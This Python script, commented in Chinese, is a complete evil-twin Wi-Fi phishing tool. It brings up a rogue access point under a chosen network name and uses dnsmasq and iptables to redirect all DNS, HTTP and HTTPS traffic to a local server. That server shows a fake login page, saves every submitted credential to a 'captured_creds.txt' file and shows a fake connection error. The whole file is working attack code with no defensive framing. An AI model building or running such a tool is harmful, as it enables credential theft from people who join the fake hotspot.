import os
import sys
import time
import subprocess
import argparse
import shutil
from http.server import BaseHTTPRequestHandler, HTTPServer

# ================= 配置区域 =================
AP_IP = "10.0.0.1"
DHCP_RANGE = "10.0.0.10,10.0.0.100,12h"
WEB_PORT = 80
TMP_DIR = "/tmp/eviltwin"

if not os.path.exists(TMP_DIR):
    os.makedirs(TMP_DIR)


def log(msg, level="INFO"):
    timestamp = time.strftime("%H:%M:%S", time.localtime())
    formatted_msg = f"[{timestamp}] [{level}] {msg}"
    print(formatted_msg)
    sys.stdout.flush()
    with open(f"{TMP_DIR}/debug.log", "a") as f:
        f.write(formatted_msg + "\n")


# ================= 钓鱼 Web 服务器 =================
class PhishingHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        template_path = f"{TMP_DIR}/index.html"
        if os.path.exists(template_path):
            with open(template_path, 'r', encoding='utf-8') as f:
                self.wfile.write(f.read().encode('utf-8'))
        else:
            self.wfile.write(b"<h1>Login Error</h1>")

    def do_POST(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length).decode('utf-8')
            log(f"捕获凭证: {data}", "LOOT")
            with open(f"{TMP_DIR}/captured_creds.txt", "a") as f:
                f.write(f"{data}\n")

            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"<script>alert('Connection Failed. Please try again.');</script>")
        except Exception:
            pass


def start_web_server():
    try:
        server = HTTPServer(('0.0.0.0', WEB_PORT), PhishingHandler)
        log(f"Web Server 运行中 ({AP_IP}:{WEB_PORT})", "WEB")
        server.serve_forever()
    except Exception as e:
        log(f"Web 启动失败: {e}", "ERROR")


# ================= 核心功能 =================
def run_cmd(cmd):
    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def cleanup_network():
    log("深度清理网络环境...", "SYSTEM")
    run_cmd("airmon-ng check kill")  # 必杀技：杀掉干扰进程
    run_cmd("killall hostapd dnsmasq wpa_supplicant dhclient")
    run_cmd("rfkill unblock wlan")
    run_cmd("rfkill unblock all")
    time.sleep(2)


def setup_interface(interface):
    log(f"配置网关 IP ({interface})...", "NET")
    run_cmd(f"ip link set {interface} down")
    run_cmd(f"ip addr flush dev {interface}")
    run_cmd(f"ip link set {interface} up")
    run_cmd(f"ip addr add {AP_IP}/24 dev {interface}")


def start_dnsmasq(interface):
    log("启动 DHCP/DNS (dnsmasq)...", "SRV")
    conf = f"""interface={interface}
dhcp-range={DHCP_RANGE}
dhcp-option=3,{AP_IP}
dhcp-option=6,{AP_IP}
server=8.8.8.8
address=/#/{AP_IP}
"""
    with open(f"{TMP_DIR}/dnsmasq.conf", "w") as f:
        f.write(conf)
    subprocess.Popen(f"dnsmasq -C {TMP_DIR}/dnsmasq.conf -d", shell=True, stdout=subprocess.DEVNULL,
                     stderr=subprocess.DEVNULL)


def start_hostapd(interface, ssid, channel):
    log(f"启动伪造热点 (SSID: {ssid} CH: {channel})...", "AP")
    conf = f"""interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
    with open(f"{TMP_DIR}/hostapd.conf", "w") as f:
        f.write(conf)

    with open(f"{TMP_DIR}/hostapd.log", "w") as logf:
        subprocess.Popen(f"hostapd {TMP_DIR}/hostapd.conf", shell=True, stdout=logf, stderr=subprocess.STDOUT)
    time.sleep(2)


def setup_iptables(interface):
    log("配置流量劫持 (iptables)...", "FW")
    run_cmd("echo 1 > /proc/sys/net/ipv4/ip_forward")
    run_cmd("iptables -t nat -F")
    run_cmd(f"iptables -t nat -A PREROUTING -i {interface} -p udp --dport 53 -j DNAT --to {AP_IP}")
    run_cmd(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j DNAT --to {AP_IP}:{WEB_PORT}")
    run_cmd(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j DNAT --to {AP_IP}:{WEB_PORT}")
    run_cmd("iptables -t nat -A POSTROUTING -j MASQUERADE")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--interface", required=True)
    parser.add_argument("--ssid", required=True)
    parser.add_argument("--channel", default="6")
    parser.add_argument("--template", default="<h1>Login</h1>")
    args = parser.parse_args()

    with open(f"{TMP_DIR}/index.html", "w", encoding='utf-8') as f:
        f.write(args.template)

    cleanup_network()
    setup_interface(args.interface)
    start_dnsmasq(args.interface)
    start_hostapd(args.interface, args.ssid, args.channel)
    setup_iptables(args.interface)
    start_web_server()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        run_cmd("killall hostapd dnsmasq")